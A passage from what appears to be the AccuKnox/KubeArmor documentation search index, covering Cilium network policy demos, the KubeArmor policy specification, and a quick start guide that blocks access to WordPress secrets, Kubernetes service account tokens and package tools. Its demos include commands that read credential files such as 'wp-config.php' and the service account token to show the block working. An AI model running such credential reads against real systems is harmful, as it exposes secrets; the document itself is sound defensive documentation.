VM, run <code>karmor</code> in VM and watch on alerts. <pre><code>karmor log\n</code></pre> Output: <pre><code>gRPC server: localhost:32767\nCreated a gRPC client (localhost:32767)\nChecked the liveness of the gRPC server\nStarted to watch alerts\n</code></pre></p> <ol> <li>With the above mentioned policy enforced in the VM, if a user tries to access <code>/proc/cpuinfo</code> file, user will see <code>permission denied</code> error and <code>karmor log</code> will show the alert log for blocking the file access as shown below. <pre><code>cat /proc/cpuinfo\n</code></pre> Output: <pre><code>cat: /proc/cpuinfo: Permission denied\n</code></pre> Run this command: <pre><code>karmor log\n</code></pre> Output: <pre><code>gRPC server: localhost:32767\nCreated a gRPC client (localhost:32767)\nChecked the liveness of the gRPC server\nStarted to watch alerts\n\n== Alert / 2022-01-16 08:24:33.153921 ==\nCluster Name: default\nHost Name: 4511a8accc65\nPolicy Name: khp-02\nSeverity: 5\nType: MatchedHostPolicy\nSource: cat\nOperation: File\nResource: /proc/cpuinfo\nData: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY\nAction: Block\nResult: Permission denied\n</code></pre></li> </ol>"},{"location":"open-source/kvmservice-nonk8s/#step-8-apply-and-verify-cilium-network-policy","title":"Step 8: Apply and verify Cilium network policy","text":"<ol> <li>The example policy provided in <code>kvm-service/examples/cnp-l7.yaml</code> describes a network policy which only allows request to two HTTP endpoints - <code>/hello</code> and <code>/bye</code> and block everything else.</li> </ol> <p><pre><code>cat cnp-l7.yaml\n</code></pre> Output: <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1\"\nspec:\ndescription: \"Allow only certain HTTP endpoints\"\nnodeSelector:\nmatchLabels:\nname: vm1\ningress:\n- toPorts:\n- ports:\n- port: \"3000\"\nprotocol: TCP\nrules:\nhttp:\n- method: GET\npath: \"/hello\"\n- method: GET\npath: \"/bye\"\n</code></pre> Run this command: <pre><code>karmor vm --kvms policy add cnp-l7.yaml\n</code></pre> Output: <pre><code>Success\n</code></pre></p> <ol> <li> <p>In <code>kvm-service/examples/app</code>, there is a sample HTTP server application <code>http-echo-server.go</code> that sends the URL path of the request as the response. Copy the file <code>http-echo-server.go</code> to the VM which has the label <code>name: vm1</code> and run the HTTP server.  <pre><code>go run http-echo-server.go\n</code></pre> Output: <pre><code>\ud83d\ude80 HTTP echo server listening on port 3000\n</code></pre></p> </li> <li> <p>Switch to the VM which has the label <code>name: vm2</code> and try to access <code>vm1</code>'s HTTP server. <pre><code>curl http://10.20.1.34:3000/hello\n</code></pre> Output: <pre><code>hello\n</code></pre> Run this command: <pre><code>curl http://10.20.1.34:3000/bye\n</code></pre> Output: <pre><code>bye\n</code></pre> Run this command: <pre><code>curl http://10.20.1.34:3000/hi\n</code></pre> Output: <pre><code>Access denied\n</code></pre> Run this command: <pre><code>curl http://10.20.1.34:3000/thank-you\n</code></pre> Output: <pre><code>Access denied\n</code></pre> The above output shows that,</p> </li> <li>For URLs that are listed in the configured network policy, the response is received from the HTTP server</li> <li> <p>For URLs that are not listed in the configured network policy, the requests are denied.</p> </li> <li> <p>To verify this, switch to the VM which has label <code>name: vm1</code> and run <code>hubble</code> to view the network logs. <pre><code>docker exec -it cilium hubble observe -f --protocol http\n</code></pre> Output: <pre><code>Mar  1 12:11:24.513: default/testvm2:40208 -&gt; default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/hello)\nMar  1 12:11:24.522: default/testvm2:40208 &lt;- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 7ms (GET http://10.20.1.34/hello))\nMar  1 12:11:43.284: default/testvm2:40212 -&gt; default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/hello)\nMar  1 12:11:43.285: default/testvm2:40212 &lt;- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 1ms (GET http://10.20.1.34/hello))\nMar  1 12:11:46.288: default/testvm2:40214 -&gt; default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/bye)\nMar  1 12:11:46.288: default/testvm2:40214 &lt;- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 0ms (GET http://10.20.1.34/bye))\nMar  1 12:11:48.700: default/testvm2:40216 -&gt; default/testvm1:3000 http-request DROPPED (HTTP/1.1 GET http://10.20.1.34/hi)\nMar  1 12:11:51.997: default/testvm2:40218 -&gt; default/testvm1:3000 http-request DROPPED (HTTP/1.1 GET http://10.20.1.34/thank-you)\n</code></pre></p> </li> </ol>"},{"location":"open-source/open-source-accuknox/","title":"Overview","text":""},{"location":"open-source/open-source-accuknox/#accuknox-and-open-source","title":"AccuKnox and Open Source","text":"<p>AccuKnox provides most of the core policy enforcement engines and other associated tooling as open-source. Accuknox believes that a security focussed product needs to have full transparency in its operations and we also believe in the power of community. With that in mind AccuKnox has following open source components:</p>"},{"location":"open-source/open-source-accuknox/#accuknox-cilium","title":"Accuknox-Cilium","text":"<p>Accuknox maintains a fork of cilium with certain added features. While Accuknox aims to eventually upstream the changes, the upstreaming work progresses at its own pace. Accuknox-Cilium currently has following additional features:</p> <ul> <li> <p>SPIFFE based Identity Solution: Accuknox intends to use an Identity layer that is not k8s-dependent and can flexibly scale to any scenarios (IoT, Edge, 5G, VM, Bare-Metal etc). With that in mind, AccuKnox implemented the changes in Cilium control plane to provision the Identity for the workloads based on SPIFFE. AccuKnox made use of SPIRE reference implementation and integrated with Cilium. The details of this solution were presented in Kubecon 2021 (Production Identity Day) event and the recording is available here. The upstreaming work for this feature is currently in progress.</p> </li> <li> <p>Policy Audit/Staging: Policy audit/staging is an important feature that allows the user to validate the impact of policy before enforcing it. If there are connections or packets denied due to an application of a new policy that will show up in the audit policies whilst the application would still continue functioning. Cilium policies currently cannot be audited on per policy basis. This feature developed by Accuknox allows to handle two things:</p> <ul> <li>Get policy details on per alert/telemetry basis. With this it would be possible to get the policy statistics such as denied packets/connections on per policy basis.</li> <li>Allow policy audit configuration on per policy basis.</li> </ul> </li> </ul>"},{"location":"open-source/open-source-accuknox/#kubearmor","title":"KubeArmor","text":"<p>KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. With KubeArmor, a user can:</p> <ul> <li>restrict file system access for certain processes</li> <li>restrict what processes can be spawned within the pod</li> <li>restrict the capabilities that can be used by the processes within the pod</li> </ul> <p>KubeArmor differs from seccomp based profiles, wherein KubeArmor allows to dynamically set the restrictions on the pod. With seccomp the restrictions must be placed during the pod startup and cannot be changed later. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime.</p>"},{"location":"open-source/open-source-accuknox/#policy-auto-discovery","title":"Policy Auto Discovery","text":"<p>Accuknox policy enforcement engines based on KubeArmor and Cilium are very flexible and powerful. However, these policy engines must be fed with policies. With 10s or 100s of pods and workloads running in a cluster it is insanely difficult to handcraft such policies. Accuknox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies.</p> <p></p>"},{"location":"open-source/open-source-accuknox/#policy-templates","title":"Policy Templates","text":"<p>Accuknox provides recommended policies based popular workloads or for the host (based on MITRE). The policy-templates open source repo provides policy templates based on KubeArmor and Cilium policies for:</p> <ul> <li>Known CVEs and attack vectors</li> <li>Compliance frameworks (such as PCI-DSS)</li> <li>MITRE based host policies</li> <li>STIG based policies for popular workloads</li> </ul> <p>Accuknox intends to garner community contribution towards such policy-templates and open-sourced policy engines certainly helps this cause further.</p>"},{"location":"open-source/policy-specification-for-kubearmor/","title":"Specification of Security Policy for Containers","text":""},{"location":"open-source/policy-specification-for-kubearmor/#policy-specification","title":"Policy Specification","text":"<p>Here is the specification of a security policy.</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind:KubeArmorPolicy\nmetadata:\n  name: [policy name]\n  namespace: [namespace name]\n\nspec:\n  severity: [1-10]                         # --&gt; optional (1 by default)\n  tags: [\"tag\", ...]                       # --&gt; optional\n  message: [message]                       # --&gt; optional\n\n  selector:\n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\n\n  process:\n    matchPaths:\n    - path: [absolute executable path]\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]              # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchPatterns:\n    - pattern: [regex pattern]\n      ownerOnly: [true|false]              # --&gt; optional\n\n  file:\n    matchPaths:\n    - path: [absolute file path]\n      readOnly: [true|false]               # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]              # --&gt; optional\n      readOnly: [true|false]               # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchPatterns:\n    - pattern: [regex pattern]\n      readOnly: [true|false]               # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n\n  network:\n    matchProtocols:\n    - protocol: [TCP|tcp|UDP|udp|ICMP|icmp]\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n\n  capabilities:\n    matchCapabilities:\n    - capability: [capability name]\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n\n  action: [Allow|Audit|Block] (Block by default)\n</code></pre> <p>For better understanding, you can check the KubeArmorPolicy spec diagram.</p>"},{"location":"open-source/policy-specification-for-kubearmor/#policy-spec-description","title":"Policy Spec Description","text":"<p>Now, we will briefly explain how to define a security policy.</p> <ul> <li>Common</li> </ul> <p>A security policy starts with the base information such as apiVersion, kind, and metadata. The apiVersion and kind would be the same in any security policies. In the case of metadata, you need to specify the names of a policy and a namespace where you want to apply the policy.</p> <pre><code>  apiVersion: security.kubearmor.com/v1\n  kind:KubeArmorPolicy\n  metadata:\n    name: [policy name]\n    namespace: [namespace name]\n</code></pre> <ul> <li>Severity</li> </ul> <p>The severity part is somewhat important. You can specify the severity of a given policy from 1 to 10. This severity will appear in alerts when policy violations happen.</p> <pre><code>severity: [1-10]\n</code></pre> <ul> <li>Tags</li> </ul> <p>The tags part is optional. You can define multiple tags (e.g., WARNNING, SENSITIVE, MITRE, STIG, etc.) to categorize security policies.</p> <pre><code>tags: [\"tag1\", ..., \"tagN\"]\n</code></pre> <ul> <li>Message</li> </ul> <p>The message part is optional. You can add an alert message, and then the message will be presented in alert logs.</p> <pre><code>message: [message]\n</code></pre> <ul> <li>Selector</li> </ul> <p>The selector part is relatively straightforward. Similar to other Kubernetes configurations, you can specify \\(a group of\\) pods based on labels.</p> <pre><code>  selector:\n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\n</code></pre> <ul> <li>Process</li> </ul> <p>In the process section, there are three types of matches: matchPaths, matchDirectories, and matchPatterns. You can define specific executables using matchPaths or all executables in specific directories using matchDirectories. In the case of matchPatterns, advanced operators may be able to determine particular patterns for executables by using regular expressions. However, the coverage of regular expressions is highly dependent on AppArmor \\([Policy Core Reference](https://gitlab.com/apparmor/apparmor/-/wikis/AppArmor_Core_Policy_Reference)\\). Thus, we generally do not recommend using this match.</p> <pre><code>  process:\n    matchPaths:\n    - path: [absolute executable path]\n      ownerOnly: [true|false]            # --&gt; optional\n      fromSource:                        # --&gt; optional\n      - path: [absolute executable path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]            # --&gt; optional\n      ownerOnly: [true|false]            # --&gt; optional\n      fromSource:                        # --&gt; optional\n      - path: [absolute exectuable path]\n    matchPatterns:\n    - pattern: [regex pattern]\n      ownerOnly: [true|false]            # --&gt; optional\n</code></pre> <p>In each match, there are three options.</p> <ul> <li> <p>ownerOnly \\(static action: allow owner only; otherwise block all\\)</p> <p>If this is enabled, the owners of the executable\\(s\\) defined with matchPaths and matchDirectories will be only allowed to execute.</p> </li> <li> <p>recursive</p> <p>If this is enabled, the coverage will extend to the subdirectories of the directory defined with matchDirectories.</p> </li> <li> <p>fromSource</p> <p>If a path is specified in fromSource, the executable at the path will be allowed/blocked to execute the executables defined with matchPaths or matchDirectories. For better understanding, let us say that an operator defines a policy as follows. Then, /bin/bash will be only allowed (blocked) to execute /bin/sleep. Otherwise, the execution of /bin/sleep will be blocked (allowed).</p> <pre><code>  process:\n    matchPaths:\n    - path: /bin/sleep\n      fromSource:\n      - path: /bin/bash\n</code></pre> </li> <li> <p>File</p> </li> </ul> <p>The file section is quite similar to the process section.</p> <pre><code>  file:\n    matchPaths:\n    - path: [absolute file path]\n      readOnly: [true|false]             # --&gt; optional\n      ownerOnly: [true|false]            # --&gt; optional\n      fromSource:                        # --&gt; optional\n      - path: [absolute file path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]            # --&gt; optional\n      readOnly: [true|false]             # --&gt; optional\n      ownerOnly: [true|false]            # --&gt; optional\n      fromSource:                        # --&gt; optional\n      - path: [absolute file path]\n    matchPatterns:\n    - pattern: [regex pattern]\n      readOnly: [true|false]             # --&gt; optional\n      ownerOnly: [true|false]            # --&gt; optional\n</code></pre> <p>The only difference between 'process' and 'file' is the readOnly option.</p> <ul> <li> <p>readOnly \\(static action: allow to read only; otherwise block all\\)</p> <p>If this is enabled, the read operation will be only allowed, and any other operations \\(e.g., write\\) will be blocked.  </p> </li> <li> <p>Network</p> </li> </ul> <p>In the case of network, there is currently one match type: matchProtocols. You can define specific protocols among TCP, UDP, and ICMP.</p> <pre><code>  network:\n    matchProtocols:\n    - protocol: [protocol]               # --&gt; [ TCP | tcp | UDP | udp | ICMP | icmp ]\n      fromSource:                        # --&gt; optional\n      - path: [absolute file path]\n</code></pre> <ul> <li>Capabilities</li> </ul> <p>In the case of capabilities, there is currently one match type: matchCapabilities. You can define specific capability names to allow or block using matchCapabilities. You can check available capabilities in Capability List.</p> <pre><code>  capabilities:\n    matchCapabilities:\n    - capability: [capability name]\n      fromSource:                        # --&gt; optional\n      - path: [absolute file path]\n</code></pre> <ul> <li>Action</li> </ul> <p>The action could be Allow, Audit, or Block. Security policies would be handled in a blacklist manner or a whitelist manner according to the action. Thus, you need to define the action carefully. You can refer to Consideration in Policy Action for more details. In the case of the Audit action, we can use this action for policy verification before applying a security policy with the Block action.</p> <pre><code>  action: [Allow|Audit|Block]\n</code></pre>"},{"location":"open-source/policy-templates/","title":"Policy templates","text":"<p>Accuknox's open source policy discovery engine can then be used to generate the policies based on the observation automatically. </p> <ul> <li> <p>generate policies as code representing application file access, network access and process forking) enforceable by Kubearmor.</p> </li> <li> <p>generate policies for Network access (L3, L4 and L7) enforceable by Cilium.</p> </li> </ul> <p>These generated policies are then enforced using Kubearmor and Cilium.</p>"},{"location":"open-source/quick_start_guide/","title":"Setup Instructions","text":"Deploying Sample Cluster (skip if you already have a cluster configured) Local K3s clusterGKE clusterAKS clusterEKS clusterKubeadm <p>Install K3s</p> <p>Note: Recommended base OS image is Ubuntu 20.04.</p> <pre><code>curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC='--disable traefik' sh -s - --write-kubeconfig-mode 644\n</code></pre> <p>Make K3's cluster config the default</p> <pre><code>mkdir -p ~/.kube &amp;&amp; cp /etc/rancher/k3s/k3s.yaml ~/.kube/config\n</code></pre> <pre><code> - name: create a cluster\nhosts: localhost\ntasks:\n- name: create a cluster\ngoogle.cloud.gcp_container_cluster:\nname: gkecluster\ninitial_node_count: 1\nnode_config:\nmachine_type: e2-medium\ndisk_size_gb: 10\ntaints:\n- effect: PREFER_NO_SCHEDULE\nkey: node.cilium.io/agent-not-ready\nvalue: \"true\"\nlocation: asia-east1\nproject: \"{{project_id}}\"\nauth_kind: serviceaccount\nservice_account_file: \"{{service_account_file}}\"\nstate: present\n</code></pre> <pre><code>sudo apt-get install python3 -y\n</code></pre> <p><pre><code>sudo apt-get install ansible\n</code></pre> <pre><code>ansible-galaxy collection install google.cloud\n</code></pre></p> <pre><code>ansible-playbook kube-cluster.yaml\n</code></pre> <pre><code> - name: Create a managed Azure Container Services (AKS) instance\nhosts: localhost\ntasks:\n- name:\nazure_rm_aks:\nname: myAKS\nlocation: eastus\nresource_group: myResourceGroup\ndns_prefix: akstest\nkubernetes_version: 1.24.3\nlinux_profile:\nadmin_username: azureuser\nssh_key: \"{{local_ssh_key}}\"\nservice_principal:\nclient_id: \"{{azure_account_client_id}}\"\nclient_secret: \"{{azure_account_client_secret}}\"\nagent_pool_profiles:\n- name: default\ncount: 2\nvm_size: Standard_D2_v2\n</code></pre> <pre><code>sudo apt-get install python3 -y\n</code></pre> <pre><code>sudo apt-get install ansible\n</code></pre> <pre><code>ansible-galaxy collection install azure.azcollection\n</code></pre> <pre><code>ansible-playbook aks-cluster.yaml\n</code></pre> <pre><code>apiVersion: eksctl.io/v1alpha5\nkind: ClusterConfig\n\nmetadata:\nname: kubearmor-ub20\nregion: us-east-2\n\nnodeGroups:\n- name: ng-1\namiFamily: \"Ubuntu2004\"\nprivateNetworking: true\ndesiredCapacity: 2\n# taint nodes so that application pods are\n# not scheduled until Cilium is deployed.\ntaints:\n- key: \"node.cilium.io/agent-not-ready\"\nvalue: \"true\"\neffect: \"NoSchedule\"\nssh:\nallow: true\npreBootstrapCommands:\n- \"sudo apt install linux-headers-$(uname -r)\"\n</code></pre> <pre><code>eksctl create cluster -f sample-ubuntu-18.04-cluster.yaml\n</code></pre> <pre><code>aws eks --region us-east-1 update-kubeconfig --name kubearmor-ub20\n</code></pre> <p>Install Pre-requisites</p> <ul> <li> <p>VirtualBox</p> </li> <li> <p>Vagrant</p> </li> <li> <p>kubectl</p> </li> <li> <p>Helm</p> </li> </ul> <p>Download the Vagrant setup</p> <ul> <li>Click here to download</li> </ul> <p>Untar and goto the Vagrant setup directory, Run the below command</p> <pre><code>vagrant up\n</code></pre> <p>Ref: KubeArmor support matrix</p>"},{"location":"open-source/quick_start_guide/#1-install-kubearmor-cli-tool-daemonsets-and-services","title":"1. Install kubearmor cli tool, daemonsets and services","text":""},{"location":"open-source/quick_start_guide/#install-kubearmor-cli-tool","title":"Install kubearmor cli tool","text":"<pre><code>curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/quick_start_guide/#install-daemonsets-and-services","title":"Install DaemonSets and Services","text":"<pre><code># Install KubeArmor\nkarmor install\n\n# Install Discovery-Engine\nkubectl apply -f https://raw.githubusercontent.com/kubearmor/discovery-engine/dev/deployments/k8s/deployment.yaml\n</code></pre> Output from kubectl get pods -A <pre><code>NAMESPACE         NAME                                                 READY   STATUS    RESTARTS   AGE\naccuknox-agents   discovery-engine-7b6ddbd7d7-swk7j                    1/1     Running   0          3m58s\nkube-system       kubearmor-78tnh                                      1/1     Running   0          4m7s\nkube-system       kubearmor-annotation-manager-797c848b9c-vxq8c        2/2     Running   0          4m\nkube-system       kubearmor-host-policy-manager-766447b4d7-fr5m4       2/2     Running   0          4m6s\nkube-system       kubearmor-policy-manager-54ffc4dc56-8szmn            2/2     Running   0          4m6s\nkube-system       kubearmor-relay-645667c695-bfwcn                     1/1     Running   0          4m7s\n...\n</code></pre> <p>We have following installed:</p> <ul> <li>KubeArmor Protection Engine</li> <li>Discovery Engine</li> <li>KubeArmor Relay</li> </ul>"},{"location":"open-source/quick_start_guide/#2-install-sample-application","title":"2. Install Sample Application","text":"<p>Install the following app (WordPress) or you can try your own K8s app.</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre> Output from kubectl get pods -n wordpress-mysql <pre><code>NAME                        READY   STATUS    RESTARTS   AGE\nmysql-58cdf6ccf-kzbp8       1/1     Running   0          12s\nwordpress-bf95888cb-2kx65   1/1     Running   0          13s\n</code></pre> <p>Keep a note of these pods name <code>mysql-xxxxxxxxx-xxxxx</code> &amp; <code>wordpress-xxxxxxxxx-xxxxx</code>, it'll be different for your environment</p> <p>The use-cases described in subsequent step uses this sample application.</p>"},{"location":"open-source/quick_start_guide/#3-demo-scenario-use-cases","title":"3. Demo Scenario &amp; Use-cases","text":"Use-case 1: Audit access to sensitive data paths <p>MySQL keeps all its database tables as part of <code>/var/lib/mysql</code> folder path. Audit access to this folder path recursively (sub-folders inclusive).</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-mysql-audit-dir\nnamespace: wordpress-mysql\nspec:\nseverity: 5\nselector:\nmatchLabels:\napp: mysql\nfile:\nmatchDirectories:\n- dir: /var/lib/mysql/\nrecursive: true\naction: Audit\n</code></pre> <p>Executing inside MySQL pod: Before applying policy <pre><code>kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test\n</code></pre></p> <p>NOTE 01: Replace <code>mysql-xxxxxxxxx-xxxxx</code> with pod name from Step #2</p> <p></p> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-mysql-audit-dir.yaml\n</code></pre></p> <p>Port Forwarding: We'll be using KubeArmor relay to forward logs to our local system <pre><code>kubectl -n kube-system port-forward service/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre></p> <p>Realtime Logs Streaming: <pre><code>karmor log\n</code></pre></p> <p>NOTE 02: Above 2 commands will be common for all use cases, keep this open in separate terminals (right section of screenshot)</p> <p>Executing inside MySQL pod: After applying policy <pre><code>kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test-2\n</code></pre> </p> Use-case 2: Block access to files containing sensitive data <p>WordPress pod contains a file <code>wp-config.php</code> that has sensitive auth credentials. This use-case is to Block access to this file from unknown processes.</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-wordpress-block-config\nnamespace: wordpress-mysql\nspec:\nseverity: 10\nselector:\nmatchLabels:\napp: wordpress\nfile:\nmatchPaths:\n- path: /var/www/html/wp-config.php\nfromSource:\n- path: /bin/cat\naction: Block\n</code></pre> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-wordpress-block-config.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php\ncat: /var/www/html/wp-config.php: Permission denied\n</code></pre></p> <p></p> Use-case 3: Block access to K8s service account token <p>A pod is the primary execution unit in K8s. One problem with this approach is that all the processes within that pod have unrestricted access to the pod's volume mounts. One such volume mount is a service account token. Thus, accessing a service account token using an injected binary is a common attack pattern in K8s. This use-case explains how you can protect access (Block) to the service account token through known processes only.</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-wordpress-block-sa\nnamespace: wordpress-mysql\nspec:\nseverity: 7\nselector:\nmatchLabels:\napp: wordpress\nfile:\nmatchDirectories:\n- dir: /run/secrets/kubernetes.io/serviceaccount/\nrecursive: true\naction: Block\n</code></pre> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-wordpress-block-sa.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token\ncat: /run/secrets/kubernetes.io/serviceaccount/token: Permission denied\n</code></pre></p> <p></p> Use-case 4: Block execution of unwanted processes <p>A container image might get shipped with binaries that are not supposed to be executed in production environments. For e.g., WordPress contains <code>apt</code>, <code>apt-get</code> binaries that are used for dynamic package management. These should never be used in the production environment since it will create drift (change) in the container contents i.e., introduce new files/binaries that might increase the attack surface. The following policy Block the execution of such processes.</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-wordpress-block-process\nnamespace: wordpress-mysql\nspec:\nseverity: 3\nselector:\nmatchLabels:\napp: wordpress\nprocess:\nmatchPaths:\n- path: /usr/bin/apt\n- path: /usr/bin/apt-get\naction: Block\n</code></pre> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-wordpress-block-process.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-5679855487-58rfz -n wordpress-mysql \u2013- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt\nbash: /usr/bin/apt: Permission denied\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update\nbash: /usr/bin/apt-get: Permission denied\n</code></pre></p> <p></p>"},{"location":"open-source/quick_start_guide/#4-get-recommended-policies","title":"4. Get Recommended Policies","text":"<p>In the above Demo Scenario, we had to explicitly write KubeArmor policies. But with the new KubeArmor recommendation it is easy to get a set of security best practice policies tailored to your environment. </p> karmor recommend --namespace wordpress-mysql --labels app=wordpress <pre><code>INFO[0000] pulling image                                 image=\"wordpress:4.8-apache\"\n4.8-apache: Pulling from library/wordpress\nDigest: sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nStatus: Image is up to date for wordpress:4.8-apache\nINFO[0015] dumped image to tar                           tar=/tmp/karmor4070582578/GwoIiuRV.tar\nDistribution debian\nINFO[0018] No runtime policy generated for wordpress-mysql/wordpress/wordpress:4.8-apache \ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-maintenance-tool-access.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-cert-access.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-system-owner-discovery.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-system-monitoring-deny-write-under-bin-directory.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-system-monitoring-write-under-dev-directory.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-least-functionality-execute-package-management-process-in-container.yaml ...\noutput report in out/report.txt ...\n</code></pre> Using recommended policies <p>The recommended policy <code>xx-xx-cert-access.yaml</code> is a powerful policy which enables read access to trusted certificates but denied any form of write to it. This inturn enables the integrity of the file and denies malware/adware to have Adversary-in-the-Middle capability (Ref MITRE-T1553).</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# cd /etc/ssl/\nroot@wordpress-cb9c668d4-zgczt:/etc/ssl# echo \"new private key\" &gt; myssl.pem\nroot@wordpress-cb9c668d4-zgczt:/etc/ssl# cat myssl.pem \nnew private key\nroot@wordpress-cb9c668d4-zgczt:/etc/ssl#\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: wordpress-wordpress-4-8-apache-cert-access\nnamespace: wordpress-mysql\nspec:\naction: Block\nfile:\nmatchDirectories:\n- dir: /etc/ssl/\nreadOnly: true\nrecursive: true\n- dir: /etc/pki/\nreadOnly: true\nrecursive: true\n- dir: /usr/local/share/ca-certificates/\nreadOnly: true\nrecursive: true\nmessage: Credentials modification denied\nselector:\nmatchLabels:\napp: wordpress\nseverity: 1\ntags:\n- MITRE\n- MITRE_T1552_unsecured_credentials\n</code></pre> <p>Applying Policy: Applying above recommended policy to deployed application <pre><code>kubectl apply -f out/wordpress-mysql-wordpress/wordpress-4-8-apache-cert-access.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-cb9c668d4-zgczt -n wordpress-mysql \u2013- bash\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# cd /etc/ssl/\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# cat myssl.pem \nnew private key\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# echo \"updated ssl key\" &gt;&gt; myssl.pem \nbash: /etc/ssl/myssl.pem: Permission denied\nroot@wordpress-cb9c668d4-zgczt:/var/www/html#\n</code></pre></p> <p> </p>"},{"location":"open-source/quick_start_guide/#5-get-auto-discovered-policies","title":"5. Get Auto-Discovered Policies","text":"<p>In the above Demo Scenario (last 3 use-cases), we had explicit Deny based policies. KubeArmor also supports Allow based policies i.e., allow only specific actions and audit/deny everything else. Also the allow-policies are auto-discovered by examining the workloads at runtime.</p> <p>To retrieve the auto discovered policies you can use: <pre><code>karmor discover -n wordpress-mysql -l \"app=wordpress\" -f yaml\n</code></pre> This discovers the policies for a workload in <code>wordpress-mysql</code> namespace having label <code>app=wordpress</code>.</p> Output from karmor discover -n wordpress-mysql 